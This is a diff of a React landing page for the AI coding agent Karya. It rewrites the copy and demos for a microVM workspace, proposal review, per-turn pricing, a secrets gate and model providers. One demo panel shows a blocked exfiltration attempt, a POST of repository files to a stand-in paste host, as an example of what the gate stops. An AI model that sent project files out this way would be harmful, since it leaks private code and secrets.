-                <p data-reveal className="m-0 max-w-[52ch] font-serif text-[18px] leading-[1.6] text-pretty text-fg-2">Approve once, for this session, or always (saved as a rule). Or deny with a reason: the call does not run, and your reason goes back to the model so it can propose something else or stop.</p>
-              </div>
-              <div className="text-[13px]">
-                <ApprovalCard tool="edit" target="cmd/list.go" diff={["@@ -14,3 +14,3 @@", "-    return printTable(c.OutOrStdout(), tasks)", "+    return printJSON(c.OutOrStdout(), tasks)"]} status="denied" />
-                <pre className="m-0 overflow-hidden border border-line px-3 py-[10px] font-mono text-[12.5px] leading-[1.55] whitespace-pre-wrap [word-break:break-word] text-fg-2">{`tool_result → model
-{ "tool": "edit", "status": "denied", "reason": "keep the table as the default" }`}</pre>
-              </div>
-            </div>
+            <div className="mt-4 font-mono text-[12.5px] text-fg-3">YOLO mode turns the prompts off; the VM and the gate stay · approvals are planned</div>
           </div>
         </section>
 
-        {/* 01 sandbox */}
-        <section id="sandbox" className="border-t border-line">
+        {/* 01 vm */}
+        <section id="vm" className="border-t border-line">
           <div className={`${sectionPad} ${split2}`}>
             <div>
-              <div data-reveal className={label}>01 · contained by default</div>
+              <div data-reveal className={label}>01 · a computer of its own</div>
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
-                Contained, <em className={em}>not interrogated.</em>
+                Its own computer. <em className={em}>Not yours.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Most agents either ask before every command or run them on your host. Karya does neither: every bash command, and every process it starts, runs under the operating system's sandbox, so it can run without asking. sandbox-exec on macOS, bubblewrap with seccomp on Linux and WSL2. Writes are limited to the project root and a per-session temp directory, and .git stays read-only. Network is off except for allowlisted domains, with profiles for go, npm, pypi and cargo. A missing sandbox fails closed.</p>
-              <p data-reveal className={`${lead} mt-0 mb-7 max-w-[52ch]`}>The file tools are confined to the root. They reject absolute paths, paths that escape with .., and symlinks that resolve outside it.</p>
+              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Every session starts a microVM and copies your repo into /workspace, leaving out .env and key files. The agent can install what it needs, keep a Python session alive and leave servers running. None of it touches your machine: nothing it runs can reach your home directory, your SSH keys or your other projects.</p>
+              <p data-reveal className={`${lead} mt-0 mb-7 max-w-[52ch]`}>There are no live shared folders. More files or another repo come in only when you approve.</p>
               <div className="max-w-[52ch] border border-line-2 px-4 py-[14px]">
-                <div className="mb-[6px] font-mono text-[12.5px] text-fg-3">note</div>
-                <div className="font-serif text-[17px] leading-[1.5] text-fg">The sandbox limits how much damage a mistaken command can do. It is a blast-radius limiter, not a security boundary, and it should not be relied on to contain hostile code.</div>
+                <div className="mb-[6px] font-mono text-[12.5px] text-fg-3">today</div>
+                <div className="font-serif text-[17px] leading-[1.5] text-fg">The microVM, the repo copy and the shell, python and read tools work now. The network gate in this panel is planned.</div>
               </div>
             </div>
             <div data-reveal className="flex min-w-0 flex-col gap-3 font-mono text-[12.5px] leading-[1.7]">
               <div className="border border-line-2 bg-term">
                 <div className="flex flex-wrap justify-between gap-x-4 gap-y-1 border-b border-line px-[14px] py-2 text-fg-3">
-                  <span>sandbox bubblewrap+seccomp · profile go</span>
-                  <span>live</span>
+                  <span>microVM · session 7f3a2c</span>
+                  <span>demo</span>
                 </div>
                 <div className="overflow-x-auto overflow-y-hidden px-[14px] py-3">
                   {ROWS.map(([id, path, note, status, kind]) => {
@@ -761,24 +741,27 @@ export default class Landing extends React.Component<LandingProps, State> {
           </div>
         </section>
 
-        {/* 02 undo */}
-        <section id="undo" className="border-t border-line">
+        {/* 02 review */}
+        <section id="review" className="border-t border-line">
           <div className={`${sectionPad} ${split2}`}>
             <div>
-              <div data-reveal className={label}>02 · every turn can be undone</div>
+              <div data-reveal className={label}>02 · reviewed before it lands · planned</div>
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
-                Let it run. <em className={em}>Take it back.</em>
+                Nothing lands <em className={em}>unreviewed.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Before a turn's first side effect, Karya snapshots the working tree to a shadow git directory outside your project. /undo restores it, /rewind goes back several turns, /redo puts it all back. It covers every tool, bash included.</p>
-              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Every tool call is written to the log before it runs. If Karya crashes mid-call, resume marks the call as outcome unknown and never repeats it on its own.</p>
+              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>The agent never writes to your repo. Its work comes back as a proposal: the diff against your repo, plus the docs and charts it made. An oracle, a second agent, reviews it first, and a diff that deletes a test instead of fixing it goes back to the coding agent.</p>
+              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>You get a brief and decide: accept, decline, edit or suggest. Accepting takes a git checkpoint, then applies the diff. Commits happen only when you ask for them.</p>
             </div>
             <pre data-reveal className="m-0 min-w-0 overflow-x-auto border border-line-2 bg-term px-4 py-[14px] font-mono text-[13px] leading-[1.75] text-fg-2">
-              <span className="text-fg-3">turn 3 · snapshot 9c1e04 · before first side effect{"\n"}</span>
-              {"· edit  cmd/list.go  ok\n· bash  go generate ./...  sandboxed  exit 0\n· write internal/gen/list_gen.go  ok\n\n"}
+              <span className="text-fg-3">brief · proposal 2 · session 7f3a2c{"\n"}</span>
+              {"changed   internal/meter/sum.go  +1 −1\nmade      /outputs/usage-histogram.png\nchecks    go test ./...  "}
+              <span className="text-ok">passed in the VM{"\n"}</span>
+              {"flagged   nothing risky\noracle    "}
+              <span className="text-ok">pass</span>
+              {" · filter now runs before the sum\n\n"}
               <span className="text-accent">›</span>
-              <span className="text-fg"> /undo{"\n"}</span>
-              <span className="text-ok">✓ restored the tree to 9c1e04 · 3 files{"\n"}</span>
-              <span className="text-fg-3">  not covered: .gitignored build/ (reported, untouched)</span>
+              <span className="text-fg"> a{"\n"}</span>
+              <span className="text-ok">✓ checkpoint 3f9a1c · diff applied to ~/dev/billing</span>
             </pre>
           </div>
         </section>
@@ -788,11 +771,11 @@ export default class Landing extends React.Component<LandingProps, State> {
           <div className={sectionPad}>
             <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,380px),1fr))] items-end gap-x-16 gap-y-8">
               <div>
-                <div data-reveal className={label}>03 · cost you can predict</div>
+                <div data-reveal className={label}>03 · cost you can see</div>
                 <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
-                  Budgets, <em className={em}>enforced.</em>
+                  Every turn, <em className={em}>priced.</em>
                 </h2>
-                <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Limits on steps, tokens, cost and time are enforced while the task runs, not reported after. Hitting one stops the turn, says which limit fired, and leaves the session resumable. Loop detection pauses a turn after three identical calls or the same failure three times. Every task ends with a report: files changed, commands run, checks, tokens, cost and duration.</p>
+                <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Each turn shows its tokens and cost today, priced from a snapshot that ships inside Karya. Next: limits on steps, tokens, cost and time that stop the turn and say which one fired, and loop detection that pauses after the same call or failure three times.</p>
               </div>
               <div className="flex flex-col gap-[6px]">
                 <div className="font-serif text-[clamp(64px,9.5vw,150px)] leading-[0.9] font-normal tracking-[-0.04em] whitespace-nowrap tabular-nums mobile:text-[56px]">{this.state.costT >= 1 ? "$0.02" : "$" + (0.02 * e).toFixed(4)}</div>
@@ -821,10 +804,10 @@ export default class Landing extends React.Component<LandingProps, State> {
                 <tbody>
                   {(
                     [
-                      [1, "812", "188", "$0.0034", "4.2s", "read", "ok · auto", "text-fg-2"],
-                      [2, "1,046", "421", "$0.0061", "9.8s", "edit", "approved", "text-ok"],
-                      [3, "1,297", "96", "$0.0034", "18.3s", "bash", "sandboxed · exit 0", "text-ok"],
-                      [4, "1,657", "388", "$0.0071", "8.7s", "verify", "passed · done", "text-ok"],
+                      [1, "812", "188", "$0.0034", "4.2s", "shell", "exit 1 · in the VM", "text-fg-2"],
+                      [2, "1,046", "421", "$0.0061", "9.8s", "shell", "exit 0 · in the VM", "text-ok"],
+                      [3, "1,297", "96", "$0.0034", "18.3s", "oracle", "pass", "text-ok"],
+                      [4, "1,657", "388", "$0.0071", "8.7s", "apply", "accepted · checkpoint", "text-ok"],
                     ] as const
                   ).map(([k, i, o, c, d, tool, out, outColor]) => (
                     <tr key={k} className={`border-t border-line [transition:opacity_.5s] ${rowOp(k)}`}>
@@ -851,62 +834,56 @@ export default class Landing extends React.Component<LandingProps, State> {
                 </tbody>
               </table>
             </div>
-            <pre className="mt-8 mb-0 overflow-x-auto border border-line-2 px-4 py-3 font-mono text-[13px] leading-[1.7] text-fg-2">{`stopped  --max-cost reached ($1.00)
-session 7f3a2c is resumable: karya resume 7f3a2c`}</pre>
+            <pre className="mt-8 mb-0 overflow-x-auto border border-line-2 px-4 py-3 font-mono text-[13px] leading-[1.7] text-fg-2">{`stopped  max cost reached ($1.00) · planned
+the turn says which limit fired and the session stays open`}</pre>
           </div>
         </section>
 
-        {/* 04 sessions */}
-        <section id="sessions" className="border-t border-line">
+        {/* 04 secrets */}
+        <section id="secrets" className="border-t border-line">
           <div className={sectionPad}>
-            <div data-reveal className={label}>04 · sessions that follow you</div>
+            <div data-reveal className={label}>04 · your keys stay out · planned</div>
             <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
-              Start on one machine. <em className={em}>Resume on another.</em>
+              Real keys never <em className={em}>enter the VM.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Sessions are append-only JSONL logs stored outside the project. They are keyed to the git remote rather than the local path, and contain no absolute paths, hostnames or secrets. karya sync moves them through a folder, bucket or git ref you own, end-to-end encrypted, so the target never sees plaintext. On resume, Karya compares the recorded HEAD and dirty-tree flag with the live repository and tells the model what changed.</p>
+            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>The VM holds only placeholders. When a request leaves for the host a key belongs to, the gate adds the real key to the Authorization header, for that host and no other. Every request out is checked and logged: reads that carry nothing from your repo pass, writes to somewhere new ask you, and a placeholder sent anywhere else is refused.</p>
             <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,260px),1fr))] gap-4 font-mono text-[13px] leading-[1.7]">
               <div data-reveal className="border border-line-2">
-                <div className="border-b border-line px-[14px] py-2 text-fg-3">machine a · darwin</div>
+                <div className="border-b border-line px-[14px] py-2 text-fg-3">inside the VM</div>
                 <div className="overflow-x-auto px-[14px] py-3 whitespace-pre">
-                  <span className="text-fg-3">$</span> cd ~/src/tasks{"\n"}
-                  <span className="text-fg-3">$</span> karya{"\n"}
-                  <span className="text-fg-3">{"session 7f3a2c\nHEAD a1b2c3 · clean"}</span>
+                  <span className="text-fg-3">$</span> echo $STRIPE_KEY{"\n"}
+                  <span className="text-fg-3">karya-placeholder-7f3a</span>
                 </div>
               </div>
               <div className="flex flex-col justify-center gap-[6px] border border-dashed border-line-2 px-[14px] py-4">
-                <div className="text-fg-3">session key</div>
-                <div className="text-[14px] font-medium break-all">github.com/acme/tasks</div>
-                <div className="text-fg-3">
-                  7f3a2c.jsonl · append-only
-                  <br />
-                  stored outside the project
-                </div>
+                <div className="text-fg-3">the gate</div>
+                <div className="text-[14px] font-medium break-all">adds the real key</div>
+                <div className="text-fg-3">only for api.stripe.com</div>
               </div>
               <div data-reveal className="border border-line-2">
-                <div className="border-b border-line px-[14px] py-2 text-fg-3">machine b · linux</div>
+                <div className="border-b border-line px-[14px] py-2 text-fg-3">on the way to api.stripe.com</div>
                 <div className="overflow-x-auto px-[14px] py-3 whitespace-pre">
-                  <span className="text-fg-3">$</span> cd ~/work/tasks{"\n"}
-                  <span className="text-fg-3">$</span> karya resume 7f3a2c{"\n"}
-                  <span className="text-fg-3">HEAD d4e5f6 · dirty</span>
+                  <span className="text-fg-3">Authorization:</span> Bearer sk_test_••••{"\n"}
+                  <span className="text-ok">✓ allowed · logged</span>
                 </div>
               </div>
             </div>
-            <div className="mt-4 border border-accent px-4 py-[14px] font-mono text-[13px] leading-[1.7]">
-              <div className="text-fg-3">drift note, sent to the model on resume</div>
-              <div className="mt-1">HEAD moved from a1b2c3 to d4e5f6, working tree dirty, platform changed from darwin to linux.</div>
+            <div className="mt-4 border border-no px-4 py-[14px] font-mono text-[13px] leading-[1.7]">
+              <div className="text-no">blocked, and shown to you</div>
+              <div className="mt-1">POST paste.example · the body matches 14 files from internal/ · nothing left the VM</div>
             </div>
           </div>
         </section>
 
-        {/* 05 lock-in */}
-        <section id="lockin" className="border-t border-line">
+        {/* 05 models */}
+        <section id="models" className="border-t border-line">
           <div className={`${sectionPad} ${split2}`}>
             <div>
-              <div data-reveal className={label}>05 · no lock-in</div>
+              <div data-reveal className={label}>05 · any model, your keys</div>
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
-                Switch models <em className={em}>mid-session.</em>
+                Bring your <em className={em}>own model.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>The agent loop depends on a single internal provider interface: Gemini first, then Anthropic and OpenAI-compatible APIs (OpenRouter, DeepSeek, Qwen, Ollama, vLLM, LM Studio). Switch at any turn boundary with /model. Your own API keys, never logged.</p>
+              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Karya talks to providers through one interface, with API keys you own, so you pay the provider directly. OpenAI-compatible APIs work today, including OpenAI and Amazon Bedrock, which serves the default model, gpt-oss-120b. Gemini and Anthropic are next.</p>
               <div data-reveal className="mt-0 mb-5 flex flex-wrap gap-2 font-mono text-[12.5px]">
                 {PROVIDERS.map(([n, live]) => (
                   <span key={n} className={`border px-[10px] py-1 ${live ? "border-ok text-ok" : "border-line-2 text-fg-2"}`}>
@@ -914,12 +891,11 @@ session 7f3a2c is resumable: karya resume 7f3a2c`}</pre>
                     {n}
                   </span>
                 ))}
-                <span className="px-0 py-1 text-fg-3">● works today · others in M4</span>
+                <span className="px-0 py-1 text-fg-3">● works today · others planned</span>
               </div>
-              <p data-reveal className={`${lead} mt-0 mb-7 max-w-[52ch]`}>Sessions are stored in a canonical message format, never in a provider's wire types, so a log does not depend on the provider that wrote it.</p>
               <pre className="m-0 overflow-x-auto border border-line bg-bg-2 px-4 py-[14px] font-mono text-[13px] leading-[1.7]">
-                <span className="text-fg-3">$</span> export GEMINI_API_KEY=…{"\n"}
-                <span className="text-fg-3">$</span> karya --model {model} --max-cost 1.00
+                <span className="text-fg-3">$</span> export OPENAI_API_KEY=…{"\n"}
+                <span className="text-fg-3">$</span> karya -model openai/gpt-4.1-nano
               </pre>
             </div>
             <EnvTable />
